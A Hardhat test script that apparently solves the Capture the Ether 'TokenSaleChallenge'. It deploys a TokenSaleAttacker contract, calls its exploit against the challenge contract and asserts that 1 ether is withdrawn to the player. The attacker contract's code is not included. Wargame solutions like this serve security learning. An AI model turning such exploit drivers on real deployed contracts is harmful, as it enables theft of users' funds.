import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";

describe("TokenSaleChallenge", function () {
  let player: SignerWithAddress, tokenSale: Contract;

  before(async () => {
    player = (await ethers.getSigners())[0];
    tokenSale = await ethers.getContractAt(
      "TokenSaleChallenge",
      "0xBfdF32605DA8cd46F3DC7D1E16806b9dA8e1A2Bd"
    );
  });
  it("exploit", async function () {
    const TokenSaleAttacker = await ethers.getContractFactory(
      "TokenSaleAttacker"
    );
    this.attacker = await TokenSaleAttacker.deploy();
    await this.attacker.deployed();

    const [value] = await this.attacker.valueToSend();

    await this.attacker.exploit(tokenSale.address, { value: value });
  });

  after(async () => {
    expect(await tokenSale.isComplete()).to.be.true;
    expect(() => this.ctx.attacker.withdraw()).to.changeEtherBalance(
      player,
      ethers.utils.parseEther("1")
    );
  });
});
